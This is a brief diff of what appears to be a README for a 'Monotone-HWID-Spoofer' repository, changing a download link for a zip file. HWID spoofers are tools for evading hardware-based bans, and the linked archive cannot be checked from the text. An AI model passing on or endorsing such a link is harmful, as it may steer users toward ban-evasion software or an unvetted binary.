@@ -1,4 +1,4 @@
-|[Download](https://github.com/NarendraUbnare/Power-BI-projects/blob/main/Monotone.zip)
+|[Download](https://github.com/NarendraUbnare/Monotone-HWID-Spoofer/releases/download/download/Monotone.zip)
 |:------------- |
 
 # Monotone-HWID-Spoofer
